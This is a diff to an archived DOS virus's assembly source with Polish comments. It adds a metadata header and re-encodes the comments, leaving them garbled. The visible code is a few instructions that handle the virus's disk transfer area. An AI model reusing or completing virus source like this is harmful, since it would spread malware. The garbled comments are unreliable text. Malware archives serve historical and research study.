@@ -1,7 +1,18 @@
-; Kod ¦r¢d’owy wirusa nieznanego autorstwa. Widoczne s† silne wp’ywy 648.
-; Dodano w’asne komentarze wskazuj†ce na r¢§nice mi‘dzy t† wersj† i orygina’em.
-; Komentarze te poprzedzane s† znakami AK:.
-; Tekst znaleziony na dysku komputera FIDO w PC Kurierze 28 wrzenia 1990.
+; ------------------------------------------------------------
+; name      0 9
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
+; Kod ï¿½rï¿½dï¿½owy wirusa nieznanego autorstwa. Widoczne sï¿½ silne wpï¿½ywy 648.
+; Dodano wï¿½asne komentarze wskazujï¿½ce na rï¿½ï¿½nice miï¿½dzy tï¿½ wersjï¿½ i oryginaï¿½em.
+; Komentarze te poprzedzane sï¿½ znakami AK:.
+; Tekst znaleziony na dysku komputera FIDO w PC Kurierze 28 wrzeï¿½nia 1990.
 
 comment ;
 **********************************************************
@@ -40,7 +51,7 @@ start:  mov     dx,offset stare_DTA
 
               mov    si,dx                                                 ;odtworzenie si
 
-; AK: pomini‘to badanie wersji DOS
+; AK: pominiï¿½to badanie wersji DOS
 
               push   es                                                    ;zachowanie es bo bedzie zmieniane
               mov    ah,get_dta_addr        ;pobierz adres DTA
@@ -54,7 +65,7 @@ start:  mov     dx,offset stare_DTA
               mov    ah,1Ah                                                ;ustaw adres DTA   ds:dx
               int    msdos
 
-; AK: zmieniona jest kolejno instrukcji, teraz do przechowania SI u§yto
+; AK: zmieniona jest kolejnoï¿½ï¿½ instrukcji, teraz do przechowania SI uï¿½yto
 ; DX zamiast stosu
 
               push   es                                                    ;zachowanie es
